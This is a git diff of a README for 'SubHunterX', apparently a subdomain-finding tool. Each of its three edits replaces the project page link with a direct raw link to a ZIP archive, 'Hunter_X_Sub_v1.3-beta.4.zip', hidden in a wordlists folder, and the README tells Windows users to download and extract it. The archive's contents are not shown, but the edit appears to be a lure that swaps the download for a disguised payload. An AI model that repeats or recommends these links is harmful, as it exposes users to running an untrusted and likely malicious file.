@@ -1,6 +1,6 @@
 # 🔎 SubHunterX - Find Hidden Subdomains Fast
 
-[![Download SubHunterX](https://img.shields.io/badge/Download-SubHunterX-blue?style=for-the-badge&logo=github)](https://github.com/diroxpatron12/SubHunterX)
+[![Download SubHunterX](https://img.shields.io/badge/Download-SubHunterX-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ It keeps the process simple so you can move from target name to results without 
 
 ## 📥 Download and Install
 
-1. Open the download page: https://github.com/diroxpatron12/SubHunterX
+1. Open the download page: https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip
 2. Look for the latest release or the main project files
 3. Download the Windows version if one is provided
 4. If the file is a ZIP archive, extract it to a folder you can find easily
@@ -196,7 +196,7 @@ SubHunterX puts several common recon steps in one place. That saves time and red
 
 Use this link to visit the download page and get SubHunterX:
 
-https://github.com/diroxpatron12/SubHunterX
+https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip
 
 ## 📝 Basic Scan Checklist
 
